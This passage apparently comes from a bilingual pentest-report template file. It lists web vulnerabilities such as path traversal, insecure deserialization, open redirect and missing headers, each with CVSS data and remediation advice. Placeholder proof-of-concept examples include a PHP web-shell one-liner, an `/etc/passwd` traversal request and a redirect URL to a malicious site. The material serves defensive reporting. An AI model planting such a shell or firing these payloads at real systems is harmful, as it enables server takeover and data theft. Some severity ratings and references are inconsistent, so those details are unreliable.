      technicalDescription_es: 'La funcionalidad de carga de archivos de la aplicación tiene una validación débil. Puede que solo verifique la cabecera `Content-Type` o la extensión del archivo, las cuales pueden ser fácilmente falsificadas por un atacante. Al subir un archivo con una doble extensión (p. ej., `shell.php.jpg`) o manipular la solicitud, un atacante puede eludir estas verificaciones y colocar un script ejecutable en un directorio accesible por web.',
      affectedComponents_en: '[TODO Specify the vulnerable upload form, e.g., The profile picture upload form at `/profile/avatar`.]',
      affectedComponents_es: '[TODO Especificar el formulario de carga vulnerable, p. ej., El formulario de carga de foto de perfil en `/profile/avatar`.]',
      impact_en: 'A successful file upload vulnerability can lead to remote code execution (RCE), giving the attacker full control over the web server. This allows for data theft, website defacement, and pivoting into the internal network.',
      impact_es: 'Una vulnerabilidad de carga de archivos exitosa puede conducir a la ejecución remota de código (RCE), otorgando al atacante control total sobre el servidor web. Esto permite el robo de datos, la desfiguración del sitio web y el pivote hacia la red interna.',
      recommendations_en: 'Implement a multi-layered validation approach: 1. Validate file extensions against a strict whitelist. 2. Verify the file\'s magic numbers to ensure the file type matches the extension. 3. Store uploaded files in a non-web-accessible directory. 4. Rename uploaded files to a random string. 5. Serve files through a script that enforces authentication and authorization.',
      recommendations_es: 'Implementar un enfoque de validación de múltiples capas: 1. Validar las extensiones de archivo contra una lista blanca estricta. 2. Verificar los "magic numbers" del archivo para asegurar que el tipo de archivo coincide con la extensión. 3. Almacenar los archivos subidos en un directorio no accesible por web. 4. Renombrar los archivos subidos con una cadena aleatoria. 5. Servir los archivos a través de un script que aplique autenticación y autorización.',
      details_en: '[TODO Provide a PoC. Example: Uploading a file named `webshell.php` containing `<?php system($_GET["cmd"]); ?>`, then accessing it via `/uploads/webshell.php?cmd=id`.]',
      details_es: '[TODO Proporcionar un PoC. Ejemplo: Subir un archivo llamado `webshell.php` que contiene `<?php system($_GET["cmd"]); ?>`, y luego acceder a él a través de `/uploads/webshell.php?cmd=id`.]',
      remediation_en: {
          shortTerm: 'Implement a strict whitelist of allowed file extensions and MIME types on the server side.',
          mediumTerm: 'Store uploaded files outside the web root and use a random, non-guessable filename.',
          longTerm: 'Use a virus scanner or content disarm and reconstruction (CDR) solution to check all uploaded files for malicious content.',
      },
      remediation_es: {
          shortTerm: 'Implementar una lista blanca estricta de extensiones de archivo y tipos MIME permitidos en el lado del servidor.',
          mediumTerm: 'Almacenar los archivos subidos fuera del directorio raíz web y usar un nombre de archivo aleatorio y no adivinable.',
          longTerm: 'Usar un escáner de virus o una solución de desarme y reconstrucción de contenido (CDR) para verificar todos los archivos subidos en busca de contenido malicioso.',
      },
      references: ['https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload'],
      tags: ['File Upload', 'RCE'],
  },
  {
      id: 'vuln-012',
      title_en: 'Path Traversal',
      title_es: 'Recorrido de Directorios (Path Traversal)',
      cwe: 'CWE-22',
      severity: 'High',
      cvss: {
          score: 7.5,
          vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',
          attackVector: 'Network',
          attackComplexity: 'Low',
          privilegesRequired: 'None',
          userInteraction: 'None',
          scope: 'Unchanged',
          confidentiality: 'High',
          integrity: 'None',
          availability: 'None',
      },
      overview_en: 'An attacker can read arbitrary files on the server. This is possible when the application uses user-supplied input to construct a path to a file but does not properly neutralize sequences like `../`.',
      overview_es: 'Un atacante puede leer archivos arbitrarios en el servidor. Esto es posible cuando la aplicación utiliza la entrada suministrada por el usuario para construir una ruta a un archivo pero no neutraliza adecuadamente secuencias como `../`.',
      technicalDescription_en: 'The application uses a parameter to specify a file to be displayed or downloaded. An attacker can manipulate this parameter with "dot-dot-slash" (`../`) sequences to navigate outside of the intended directory and access sensitive files elsewhere on the server filesystem.',
      technicalDescription_es: 'La aplicación utiliza un parámetro para especificar un archivo a mostrar o descargar. Un atacante puede manipular este parámetro con secuencias "punto-punto-barra" (`../`) para navegar fuera del directorio previsto y acceder a archivos sensibles en otras partes del sistema de archivos del servidor.',
      affectedComponents_en: '[TODO Specify the vulnerable endpoint, e.g., `/show_image.jsp?filename=...`]',
      affectedComponents_es: '[TODO Especificar el endpoint vulnerable, p. ej., `/show_image.jsp?filename=...`]',
      impact_en: 'Path Traversal allows an attacker to read sensitive files, such as application source code, configuration files containing credentials, and system files like `/etc/passwd`.',
      impact_es: 'El recorrido de directorios permite a un atacante leer archivos sensibles, como el código fuente de la aplicación, archivos de configuración que contienen credenciales y archivos del sistema como `/etc/passwd`.',
      recommendations_en: 'The primary defense is to avoid using user-supplied input in file paths. If necessary, the application should validate the user input to ensure it only contains permitted characters and does not contain any directory traversal sequences. The canonical path of the file should be checked to ensure it resides within the intended directory.',
      recommendations_es: 'La defensa principal es evitar el uso de entradas suministradas por el usuario en las rutas de los archivos. Si es necesario, la aplicación debe validar la entrada del usuario para asegurarse de que solo contiene caracteres permitidos y no contiene ninguna secuencia de recorrido de directorios. La ruta canónica del archivo debe verificarse para asegurar que reside dentro del directorio previsto.',
      details_en: '[TODO Provide a PoC. Example: `https://example.com/view?file=../../../../etc/passwd`]',
      details_es: '[TODO Proporcionar un PoC. Ejemplo: `https://example.com/view?file=../../../../etc/passwd`]',
      remediation_en: {
          shortTerm: 'Implement input validation to strip or reject any `../` sequences from the filename parameter.',
          mediumTerm: 'After validating input, append it to a base directory and resolve the canonical path. Verify that the resulting path starts with the expected base directory.',
          longTerm: 'Refactor the application to use indirect references (e.g., an ID from a database) instead of direct filenames to retrieve files.',
      },
      remediation_es: {
          shortTerm: 'Implementar la validación de entrada para eliminar o rechazar cualquier secuencia `../` del parámetro de nombre de archivo.',
          mediumTerm: 'Después de validar la entrada, adjúntela a un directorio base y resuelva la ruta canónica. Verifique que la ruta resultante comience con el directorio base esperado.',
          longTerm: 'Refactorizar la aplicación para usar referencias indirectas (p. ej., un ID de una base de datos) en lugar de nombres de archivo directos para recuperar archivos.',
      },
      references: ['https://owasp.org/www-community/attacks/Path_Traversal'],
      tags: ['Path Traversal', 'Directory Traversal'],
  },
  {
      id: 'vuln-013',
      title_en: 'Sensitive Data Exposure',
      title_es: 'Exposición de Datos Sensibles',
      cwe: 'CWE-312',
      severity: 'Medium',
      cvss: {
          score: 5.3,
          vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N',
          attackVector: 'Network',
          attackComplexity: 'Low',
          privilegesRequired: 'None',
          userInteraction: 'None',
          scope: 'Unchanged',
          confidentiality: 'Low',
          integrity: 'None',
          availability: 'None',
      },
      overview_en: 'The application stores or transmits sensitive data, such as passwords or credit card numbers, without proper encryption. This makes the data vulnerable to interception or theft.',
      overview_es: 'La aplicación almacena o transmite datos sensibles, como contraseñas o números de tarjetas de crédito, sin el cifrado adecuado. Esto hace que los datos sean vulnerables a la interceptación o al robo.',
      technicalDescription_en: 'Sensitive data is not adequately protected. This can occur in several ways: data is transmitted over unencrypted channels (e.g., HTTP), stored in plaintext in databases or log files, or encrypted using weak or outdated cryptographic algorithms.',
      technicalDescription_es: 'Los datos sensibles no están protegidos adecuadamente. Esto puede ocurrir de varias maneras: los datos se transmiten a través de canales no cifrados (p. ej., HTTP), se almacenan en texto plano en bases de datos o archivos de registro, o se cifran utilizando algoritmos criptográficos débiles u obsoletos.',
      affectedComponents_en: '[TODO Specify where the exposure occurs, e.g., User passwords are found stored in plaintext in the `users` database table.]',
      affectedComponents_es: '[TODO Especificar dónde ocurre la exposición, p. ej., Las contraseñas de los usuarios se encuentran almacenadas en texto plano en la tabla `users` de la base de datos.]',
      impact_en: 'Exposure of sensitive data can lead to identity theft, financial fraud, and reputational damage. If credentials are leaked, it can lead to the compromise of other systems.',
      impact_es: 'La exposición de datos sensibles puede conducir al robo de identidad, fraude financiero y daño a la reputación. Si se filtran las credenciales, puede llevar al compromiso de otros sistemas.',
      recommendations_en: 'Encrypt all sensitive data both in transit (using TLS) and at rest (using strong, industry-standard encryption algorithms). Do not store sensitive data unless absolutely necessary. Use strong, salted, and adaptive hashing functions (e.g., Argon2, bcrypt) for storing passwords.',
      recommendations_es: 'Cifrar todos los datos sensibles tanto en tránsito (usando TLS) como en reposo (usando algoritmos de cifrado fuertes y estándar de la industria). No almacenar datos sensibles a menos que sea absolutamente necesario. Usar funciones de hash fuertes, con sal y adaptativas (p. ej., Argon2, bcrypt) para almacenar contraseñas.',
      details_en: '[TODO Provide evidence of the data exposure, e.g., A screenshot of a database query showing plaintext passwords.]',
      details_es: '[TODO Proporcionar evidencia de la exposición de datos, p. ej., Una captura de pantalla de una consulta de base de datos que muestra contraseñas en texto plano.]',
      remediation_en: {
          shortTerm: 'Immediately encrypt the exposed data at rest. Enforce TLS for all data in transit.',
          mediumTerm: 'For passwords, migrate from plaintext or weak hashing to a strong, salted, adaptive hashing algorithm like Argon2.',
          longTerm: 'Implement a data classification policy across the organization to identify and properly protect all sensitive data.',
      },
      remediation_es: {
          shortTerm: 'Cifrar inmediatamente los datos expuestos en reposo. Forzar el uso de TLS para todos los datos en tránsito.',
          mediumTerm: 'Para las contraseñas, migrar de texto plano o hashing débil a un algoritmo de hashing fuerte, con sal y adaptativo como Argon2.',
          longTerm: 'Implementar una política de clasificación de datos en toda la organización para identificar y proteger adecuadamente todos los datos sensibles.',
      },
      references: ['https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure'],
      tags: ['OWASP Top 10', 'Cryptography', 'A02:2021-Cryptographic_Failures'],
  },
  {
      id: 'vuln-014',
      title_en: 'Insecure Deserialization',
      title_es: 'Deserialización Insegura',
      cwe: 'CWE-502',
      severity: 'Critical',
      cvss: {
          score: 9.8,
          vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
          attackVector: 'Network',
          attackComplexity: 'Low',
          privilegesRequired: 'None',
          userInteraction: 'None',
          scope: 'Unchanged',
          confidentiality: 'High',
          integrity: 'High',
          availability: 'High',
      },
      overview_en: 'An attacker can execute arbitrary code by manipulating serialized objects that are passed to the application. This is possible when an application deserializes untrusted data without sufficient validation.',
      overview_es: 'Un atacante puede ejecutar código arbitrario manipulando objetos serializados que se pasan a la aplicación. Esto es posible cuando una aplicación deserializa datos no confiables sin una validación suficiente.',
      technicalDescription_en: 'The application deserializes data from an untrusted source (e.g., a cookie, an API request). An attacker can craft a malicious serialized object that, when deserialized, triggers the execution of code on the server by abusing the application\'s class and object structure.',
      technicalDescription_es: 'La aplicación deserializa datos de una fuente no confiable (p. ej., una cookie, una solicitud de API). Un atacante puede crear un objeto serializado malicioso que, al ser deserializado, desencadena la ejecución de código en el servidor al abusar de la estructura de clases y objetos de la aplicación.',
      affectedComponents_en: '[TODO Specify the vulnerable component, e.g., The `user_session` cookie which contains a serialized Java object.]',
      affectedComponents_es: '[TODO Especificar el componente vulnerable, p. ej., La cookie `user_session` que contiene un objeto Java serializado.]',
      impact_en: 'Insecure Deserialization often leads to remote code execution (RCE). It can also be used to cause denial of service or access control bypasses.',
      impact_es: 'La deserialización insegura a menudo conduce a la ejecución remota de código (RCE). También se puede utilizar para provocar denegaciones de servicio o eludir los controles de acceso.',
      recommendations_en: 'The safest approach is to avoid deserializing data from untrusted sources. If deserialization is necessary, use a digital signature to verify the integrity and authenticity of the serialized data. Also, use simple data formats like JSON instead of complex binary serialization formats.',
      recommendations_es: 'El enfoque más seguro es evitar la deserialización de datos de fuentes no confiables. Si la deserialización es necesaria, utilice una firma digital para verificar la integridad y autenticidad de los datos serializados. Además, utilice formatos de datos simples como JSON en lugar de formatos de serialización binarios complejos.',
      details_en: '[TODO Provide a PoC. This often requires a tool like `ysoserial` to generate the malicious payload for the target technology (e.g., Java, .NET, PHP).]',
      details_es: '[TODO Proporcionar un PoC. Esto a menudo requiere una herramienta como `ysoserial` para generar la carga útil maliciosa para la tecnología de destino (p. ej., Java, .NET, PHP).]',
      remediation_en: {
          shortTerm: 'Implement integrity checks (e.g., HMAC) on any serialized data passed between client and server to prevent tampering.',
          mediumTerm: 'Refactor the application to use a safe, standard data format like JSON for data interchange, instead of binary serialization.',
          longTerm: 'Monitor deserialization libraries and frameworks for new vulnerabilities and apply patches promptly.',
      },
      remediation_es: {
          shortTerm: 'Implementar controles de integridad (p. ej., HMAC) en cualquier dato serializado que se pase entre el cliente y el servidor para evitar la manipulación.',
          mediumTerm: 'Refactorizar la aplicación para usar un formato de datos seguro y estándar como JSON para el intercambio de datos, en lugar de la serialización binaria.',
          longTerm: 'Monitorear las librerías y frameworks de deserialización en busca de nuevas vulnerabilidades y aplicar parches con prontitud.',
      },
      references: ['https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization'],
      tags: ['OWASP Top 10', 'Deserialization', 'RCE', 'A08:2021-Software_and_Data_Integrity_Failures'],
  },
  {
      id: 'vuln-015',
      title_en: 'Directory Listing Enabled',
      title_es: 'Listado de Directorios Habilitado',
      cwe: 'CWE-548',
      severity: 'Low',
      cvss: {
          score: 5.3,
          vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N',
          attackVector: 'Network',
          attackComplexity: 'Low',
          privilegesRequired: 'None',
          userInteraction: 'None',
          scope: 'Unchanged',
          confidentiality: 'Low',
          integrity: 'None',
          availability: 'None',
      },
      overview_en: 'The web server is configured to show a listing of all files and directories when a user requests a directory that does not have an index page. This can leak sensitive information about the application\'s structure and content.',
      overview_es: 'El servidor web está configurado para mostrar un listado de todos los archivos y directorios cuando un usuario solicita un directorio que no tiene una página de índice. Esto puede filtrar información sensible sobre la estructura y el contenido de la aplicación.',
      technicalDescription_en: 'The web server software (e.g., Apache, Nginx, IIS) has directory listing enabled in its configuration. When a request is made to a directory without a default file (like `index.html`), the server generates and returns an HTML page listing the directory\'s contents.',
      technicalDescription_es: 'El software del servidor web (p. ej., Apache, Nginx, IIS) tiene habilitado el listado de directorios en su configuración. Cuando se realiza una solicitud a un directorio sin un archivo predeterminado (como `index.html`), el servidor genera y devuelve una página HTML que lista el contenido del directorio.',
      affectedComponents_en: '[TODO Specify the affected directory, e.g., `/images/`, `/admin/backups/`]',
      affectedComponents_es: '[TODO Especificar el directorio afectado, p. ej., `/images/`, `/admin/backups/`]',
      impact_en: 'Directory listing provides attackers with a map of the application, potentially revealing sensitive files, backup files, configuration files, or hidden endpoints that were not intended to be public.',
      impact_es: 'El listado de directorios proporciona a los atacantes un mapa de la aplicación, revelando potencialmente archivos sensibles, archivos de respaldo, archivos de configuración o endpoints ocultos que no estaban destinados a ser públicos.',
      recommendations_en: 'Disable directory listing in the web server configuration for all directories. Ensure every web-accessible directory has a default index page to prevent this behavior.',
      recommendations_es: 'Deshabilitar el listado de directorios en la configuración del servidor web para todos los directorios. Asegurarse de que cada directorio accesible por web tenga una página de índice predeterminada para prevenir este comportamiento.',
      details_en: '[TODO Provide a URL that demonstrates the directory listing. e.g., `https://example.com/css/`]',
      details_es: '[TODO Proporcionar una URL que demuestre el listado de directorios. p. ej., `https://example.com/css/`]',
      remediation_en: {
          shortTerm: 'Add the appropriate configuration directive to the web server to disable directory listings globally (e.g., `Options -Indexes` for Apache).',
          mediumTerm: 'Ensure that all directories served by the web server contain an index file (even if it is blank).',
          longTerm: 'Incorporate security configuration checks into the deployment pipeline to prevent this issue from recurring.',
      },
      remediation_es: {
          shortTerm: 'Añadir la directiva de configuración apropiada al servidor web para deshabilitar los listados de directorios globalmente (p. ej., `Options -Indexes` para Apache).',
          mediumTerm: 'Asegurarse de que todos los directorios servidos por el servidor web contengan un archivo de índice (incluso si está en blanco).',
          longTerm: 'Incorporar verificaciones de configuración de seguridad en el pipeline de despliegue para evitar que este problema vuelva a ocurrir.',
      },
      references: ['https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server'],
      tags: ['Information Disclosure', 'Misconfiguration'],
  },
  {
    id: 'vuln-016',
    title_en: 'Missing Secure HTTP Headers',
    title_es: 'Falta de Cabeceras HTTP Seguras',
    cwe: 'CWE-693',
    severity: 'Medium',
    cvss: {
      score: 5.3,
      vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N',
      attackVector: 'Network',
      attackComplexity: 'Low',
      privilegesRequired: 'None',
      userInteraction: 'None',
      scope: 'Unchanged',
      confidentiality: 'Low',
      integrity: 'None',
      availability: 'None',
    },
    overview_en: 'The application is missing key HTTP security headers, leaving it more vulnerable to common attacks like Cross-Site Scripting (XSS), clickjacking, and information disclosure.',
    overview_es: 'La aplicación carece de cabeceras de seguridad HTTP clave, lo que la deja más vulnerable a ataques comunes como Cross-Site Scripting (XSS), clickjacking y divulgación de información.',
    technicalDescription_en: 'The server\'s HTTP responses do not include headers such as `Content-Security-Policy`, `Strict-Transport-Security`, `X-Content-Type-Options`, `X-Frame-Options`, or `Referrer-Policy`. These headers provide an additional layer of defense by instructing the browser to enforce certain security policies.',
    technicalDescription_es: 'Las respuestas HTTP del servidor no incluyen cabeceras como `Content-Security-Policy`, `Strict-Transport-Security`, `X-Content-Type-Options`, `X-Frame-Options`, o `Referrer-Policy`. Estas cabeceras proporcionan una capa adicional de defensa al instruir al navegador para que aplique ciertas políticas de seguridad.',
    affectedComponents_en: '[TODO Specify the application URL and list the missing headers.]',
    affectedComponents_es: '[TODO Especificar la URL de la aplicación y listar las cabeceras faltantes.]',
    impact_en: 'The absence of these headers increases the attack surface. For example, missing `X-Frame-Options` allows for clickjacking attacks, while a weak or missing `Content-Security-Policy` makes XSS attacks much easier to execute.',
    impact_es: 'La ausencia de estas cabeceras aumenta la superficie de ataque. Por ejemplo, la falta de `X-Frame-Options` permite ataques de clickjacking, mientras que una `Content-Security-Policy` débil o ausente hace que los ataques XSS sean mucho más fáciles de ejecutar.',
    recommendations_en: 'Configure the web server or application to include the following HTTP security headers in all responses: `Strict-Transport-Security`, `Content-Security-Policy`, `X-Content-Type-Options`, `X-Frame-Options`, and `Referrer-Policy`.',
    recommendations_es: 'Configurar el servidor web o la aplicación para incluir las siguientes cabeceras de seguridad HTTP en todas las respuestas: `Strict-Transport-Security`, `Content-Security-Policy`, `X-Content-Type-Options`, `X-Frame-Options` y `Referrer-Policy`.',
    details_en: '[TODO Provide a table showing the recommended headers and their suggested values. E.g., `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`]',
    details_es: '[TODO Proporcionar una tabla que muestre las cabeceras recomendadas y sus valores sugeridos. P. ej., `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`]',
    remediation_en: {
      shortTerm: 'Implement `X-Frame-Options: DENY` and `X-Content-Type-Options: nosniff` as they are easy to deploy and have high impact.',
      mediumTerm: 'Implement a strict `Content-Security-Policy` (CSP). This may require significant testing to avoid breaking application functionality.',
      longTerm: 'Automate security header checks in the CI/CD pipeline to ensure all new endpoints have the correct headers.',
    },
    remediation_es: {
      shortTerm: 'Implementar `X-Frame-Options: DENY` y `X-Content-Type-Options: nosniff` ya que son fáciles de desplegar y tienen un alto impacto.',
      mediumTerm: 'Implementar una `Content-Security-Policy` (CSP) estricta. Esto puede requerir pruebas significativas para evitar romper la funcionalidad de la aplicación.',
      longTerm: 'Automatizar las verificaciones de cabeceras de seguridad en el pipeline de CI/CD para garantizar que todos los nuevos endpoints tengan las cabeceras correctas.',
    },
    references: ['https://owasp.org/www-project-secure-headers/'],
    tags: ['Security Headers', 'Misconfiguration'],
  },
  {
    id: 'vuln-017',
    title_en: 'Broken Authentication',
    title_es: 'Autenticación Rota',
    cwe: 'CWE-287',
    severity: 'High',
    cvss: {
      score: 8.8,
      vectorString: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H',
      attackVector: 'Network',
      attackComplexity: 'Low',
      privilegesRequired: 'Low',
      userInteraction: 'None',
      scope: 'Unchanged',
      confidentiality: 'High',
      integrity: 'High',
      availability: 'High',
    },
    overview_en: 'Authentication and session management are not implemented correctly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users\' identities temporarily or permanently.',
    overview_es: 'La autenticación y la gestión de sesiones no se implementan correctamente, lo que permite a los atacantes comprometer contraseñas, claves o tokens de sesión, o explotar otros fallos de implementación para asumir las identidades de otros usuarios de forma temporal o permanente.',
    technicalDescription_en: '[TODO Be specific. Examples: The application permits weak passwords. Session tokens are predictable. The "forgot password" feature is vulnerable to enumeration. Session tokens are not invalidated upon logout.]',
    technicalDescription_es: '[TODO Ser específico. Ejemplos: La aplicación permite contraseñas débiles. Los tokens de sesión son predecibles. La función de "olvidé mi contraseña" es vulnerable a la enumeración. Los tokens de sesión no se invalidan al cerrar sesión.]',
    affectedComponents_en: '[TODO Specify the vulnerable functionality, e.g., The login process, session management, or password reset workflow.]',
    affectedComponents_es: '[TODO Especificar la funcionalidad vulnerable, p. ej., El proceso de inicio de sesión, la gestión de sesiones o el flujo de restablecimiento de contraseña.]',
    impact_en: 'Attackers can gain unauthorized access to user accounts, potentially leading to full system compromise if an administrative account is taken over.',
    impact_es: 'Los atacantes pueden obtener acceso no autorizado a las cuentas de los usuarios, lo que podría conducir a un compromiso total del sistema si se toma el control de una cuenta administrativa.',
    recommendations_en: 'Implement multi-factor authentication (MFA). Enforce strong password policies. Use a secure session management mechanism with expiring, random tokens. Protect against automated attacks like credential stuffing and brute-forcing with rate limiting and account lockouts.',
    recommendations_es: 'Implementar la autenticación de múltiples factores (MFA). Hacer cumplir políticas de contraseñas seguras. Usar un mecanismo de gestión de sesiones seguro con tokens aleatorios y que expiren. Proteger contra ataques automatizados como el "credential stuffing" y la fuerza bruta con limitación de velocidad y bloqueo de cuentas.',
    details_en: '[TODO Provide a PoC for the specific flaw. E.g., Show that a user can brute-force a password due to lack of rate limiting.]',
    details_es: '[TODO Proporcionar un PoC para el fallo específico. P. ej., Demostrar que un usuario puede forzar una contraseña por fuerza bruta debido a la falta de limitación de velocidad.]',
    remediation_en: {
      shortTerm: 'Implement rate limiting and account lockout policies on the login page.',
      mediumTerm: 'Invalidate session tokens on the server-side after logout. Implement a strong password policy.',
      longTerm: 'Implement multi-factor authentication (MFA) for all users, especially administrators.',
    },
    remediation_es: {
      shortTerm: 'Implementar políticas de limitación de velocidad y bloqueo de cuentas en la página de inicio de sesión.',
      mediumTerm: 'Invalidar los tokens de sesión en el lado del servidor después de cerrar sesión. Implementar una política de contraseñas seguras.',
      longTerm: 'Implementar la autenticación de múltiples factores (MFA) para todos los usuarios, especialmente los administradores.',
    },
    references: ['https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication'],
    tags: ['OWASP Top 10', 'Authentication', 'A07:2021-Identification_and_Authentication_Failures'],
  },
  {
    id: 'vuln-018',
    title_en: 'Open Redirect',
    title_es: 'Redirección Abierta',
    cwe: 'CWE-601',
    severity: 'Medium',
    cvss: {
      score: 6.1,
      vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N',
      attackVector: 'Network',
      attackComplexity: 'Low',
      privilegesRequired: 'None',
      userInteraction: 'Required',
      scope: 'Changed',
      confidentiality: 'Low',
      integrity: 'Low',
      availability: 'None',
    },
    overview_en: 'An attacker can redirect users to an arbitrary external website. This is often used in phishing attacks to trick users into visiting a malicious site by crafting a URL that appears to be for the legitimate application.',
    overview_es: 'Un atacante puede redirigir a los usuarios a un sitio web externo arbitrario. Esto se usa a menudo en ataques de phishing para engañar a los usuarios para que visiten un sitio malicioso creando una URL que parece ser para la aplicación legítima.',
    technicalDescription_en: 'The application uses a user-supplied parameter to determine where to redirect the user. Because the application does not validate this parameter, an attacker can provide a URL to a malicious website.',
    technicalDescription_es: 'La aplicación utiliza un parámetro suministrado por el usuario para determinar a dónde redirigir al usuario. Debido a que la aplicación no valida este parámetro, un atacante puede proporcionar una URL a un sitio web malicioso.',
    affectedComponents_en: '[TODO Specify the vulnerable endpoint and parameter, e.g., `/login.php?redirect_url=...`]',
    affectedComponents_es: '[TODO Especificar el endpoint y el parámetro vulnerables, p. ej., `/login.php?redirect_url=...`]',
    impact_en: 'Open redirects are primarily used to lend credibility to phishing attacks. Users who see a link pointing to a trusted domain are more likely to click it, but are then redirected to a malicious site where their credentials or personal information can be stolen.',
    impact_es: 'Las redirecciones abiertas se utilizan principalmente para dar credibilidad a los ataques de phishing. Los usuarios que ven un enlace que apunta a un dominio de confianza tienen más probabilidades de hacer clic en él, pero luego son redirigidos a un sitio malicioso donde se les puede robar sus credenciales o información personal.',
    recommendations_en: 'Avoid using redirects based on user input. If they are necessary, maintain a whitelist of approved, safe URLs that users can be redirected to. All other URLs should be rejected.',
    recommendations_es: 'Evitar el uso de redirecciones basadas en la entrada del usuario. Si son necesarias, mantener una lista blanca de URLs aprobadas y seguras a las que los usuarios pueden ser redirigidos. Todas las demás URLs deben ser rechazadas.',
    details_en: '[TODO Provide a PoC URL, e.g., `https://trusted-site.com/login?redirect_url=https://evil-site.com`]',
    details_es: '[TODO Proporcionar una URL de PoC, p. ej., `https://sitio-confiable.com/login?redirect_url=https://sitio-malvado.com`]',
    remediation_en: {
      shortTerm: 'Validate the `redirect_url` parameter to ensure it only points to a relative path within the same domain, or reject it if it contains `http` or `//`.',
      mediumTerm: 'Implement a whitelist of allowed redirect targets on the server side.',
      longTerm: 'Refactor the application to use an index-based system for redirects instead of taking a full URL as a parameter.',
    },
    remediation_es: {
      shortTerm: 'Validar el parámetro `redirect_url` para asegurarse de que solo apunte a una ruta relativa dentro del mismo dominio, o rechazarlo si contiene `http` o `//`.',
      mediumTerm: 'Implementar una lista blanca de destinos de redirección permitidos en el lado del servidor.',
      longTerm: 'Refactorizar la aplicación para usar un sistema basado en índices para las redirecciones en lugar de tomar una URL completa como parámetro.',
    },
    references: ['https://owasp.org/www-community/vulnerabilities/Unvalidated_Redirects_and_Forwards'],
    tags: ['Open Redirect', 'Phishing'],
  },
  {
      id: 'vuln-019',
      title_en: 'Improper Asset Management',
      title_es: 'Gestión Incorrecta de Activos',
      cwe: 'CWE-1035',
      severity: 'Medium',
      cvss: {
          score: 6.5,
          vectorString: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N',
          attackVector: 'Network',
          attackComplexity: 'Low',
          privilegesRequired: 'Low',
          userInteraction: 'None',
          scope: 'Unchanged',
          confidentiality: 'High',
          integrity: 'None',
          availability: 'None',
      },
      overview_en: 'Forgotten or undocumented assets such as development environments, old API versions, or unpatched systems are exposed to the internet. These assets often lack proper security controls and can be an easy entry point for attackers.',
      overview_es: 'Activos olvidados o no documentados como entornos de desarrollo, versiones antiguas de API o sistemas sin parches están expuestos a Internet. Estos activos a menudo carecen de controles de seguridad adecuados y pueden ser un punto de entrada fácil para los atacantes.',
      technicalDescription_en: 'During reconnaissance, an unprotected or outdated asset was discovered. Examples include a staging server (`staging.example.com`) with default credentials, an old version of an API (`api-v1.example.com`) with known vulnerabilities, or an exposed `.git` directory.',
      technicalDescription_es: 'Durante el reconocimiento, se descubrió un activo desprotegido u obsoleto. Los ejemplos incluyen un servidor de "staging" (`staging.example.com`) con credenciales predeterminadas, una versión antigua de una API (`api-v1.example.com`) con vulnerabilidades conocidas o un directorio `.git` exposado.',
      affectedComponents_en: '[TODO Specify the forgotten asset, e.g., An exposed admin panel at `dev-admin.example.com`.]',
      affectedComponents_es: '[TODO Especificar el activo olvidado, p. ej., Un panel de administración expuesto en `dev-admin.example.com`.]',
      impact_en: 'Improper asset management can lead to the compromise of forgotten systems, providing an initial foothold for attackers to pivot into the main corporate network. It can also lead to sensitive information disclosure.',
      impact_es: 'La gestión incorrecta de activos puede llevar al compromiso de sistemas olvidados, proporcionando un punto de apoyo inicial para que los atacantes pivoteen hacia la red corporativa principal. También puede conducir a la divulgación de información sensible.',
      recommendations_en: 'Maintain a complete and up-to-date inventory of all assets, including development, staging, and production environments. Implement a continuous monitoring and vulnerability scanning process for all discovered assets. Decommission any systems that are no longer needed.',
      recommendations_es: 'Mantener un inventario completo y actualizado de todos los activos, incluidos los entornos de desarrollo, "staging" y producción. Implementar un proceso de monitoreo continuo y escaneo de vulnerabilidades para todos los activos descubiertos. Dar de baja cualquier sistema que ya no sea necesario.',
      details_en: '[TODO Provide evidence of the exposed asset, e.g., A screenshot of the exposed admin panel.]',
      details_es: '[TODO Proporcionar evidencia del activo expuesto, p. ej., Una captura de pantalla del panel de administración expuesto.]',
      remediation_en: {
          shortTerm: 'Immediately restrict access to the discovered asset or take it offline.',
          mediumTerm: 'Conduct a full audit of all cloud and on-premise assets to create a complete inventory. Apply security baselines to all discovered systems.',
          longTerm: 'Implement an automated asset discovery and management solution to continuously monitor the attack surface.',
      },
      remediation_es: {
          shortTerm: 'Restringir inmediatamente el acceso al activo descubierto o ponerlo fuera de línea.',
          mediumTerm: 'Realizar una auditoría completa de todos los activos en la nube y locales para crear un inventario completo. Aplicar líneas base de seguridad a todos los sistemas descubiertos.',
          longTerm: 'Implementar una solución automatizada de descubrimiento y gestión de activos para monitorear continuamente la superficie de ataque.',
      },
      references: ['https://owasp.org/Top10/A09_2017-Using_Components_with_Known_Vulnerabilities/'],
      tags: ['OWASP Top 10', 'Asset Management', 'A09:2021-Security_Logging_and_Monitoring_Failures'],
  },
  {
      id: 'vuln-020',
      title_en: 'Insufficient Logging & Monitoring',
      title_es: 'Registro y Monitoreo Insuficientes',
      cwe: 'CWE-778',
      severity: 'Medium',
      cvss: {
          score: 6.5,
          vectorString: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N',
          attackVector: 'Network',
          attackComplexity: 'Low',
          privilegesRequired: 'Low',
          userInteraction: 'None',
          scope: 'Unchanged',
          confidentiality: 'High',
          integrity: 'None',
          availability: 'None',
      },
